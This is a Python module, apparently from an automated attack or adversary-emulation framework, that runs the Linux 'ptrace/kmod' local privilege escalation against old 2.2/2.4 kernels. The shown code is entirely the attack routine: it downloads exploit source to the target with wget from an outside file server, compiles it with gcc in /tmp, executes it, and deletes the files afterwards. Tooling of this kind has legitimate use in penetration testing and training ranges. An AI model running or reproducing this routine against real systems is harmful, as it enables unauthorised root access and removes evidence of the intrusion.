...
class PtraceKmodModule(Module):
    """
    Executes the Linux 'ptrace/kmod' local privilege escalation for servers with kernel version 2.2.x/2.4.x.

    Exploit-DB: https://www.exploit-db.com/exploits/3
    """
    ...
    def execute(
        ...
        exploit_source_url = self._file_manager.get_file_url_reachable_from_ip(
            type(self).__name__, "ptrace-kmod.c", ip_address
        )

        try:
            self._logger.info("transferring exploit source file...")
            shell.execute(f"wget -O /tmp/ptrace-kmod.c {exploit_source_url}")

            self._logger.info("compiling exploit binary...")
            if "error" not in "\n".join(shell.execute("bash -c 'gcc -o /tmp/ptrace-kmod /tmp/ptrace-kmod.c'")):
                self._logger.info("running exploit...")
                shell.execute("bash -c '/tmp/ptrace-kmod'", timeout=10)
            else:
                self._logger.error("exploit binary compilation failed")

            self._logger.info("cleaning up")
            shell.execute("rm /tmp/ptrace-kmod.c")
            shell.execute("rm /tmp/ptrace-kmod")
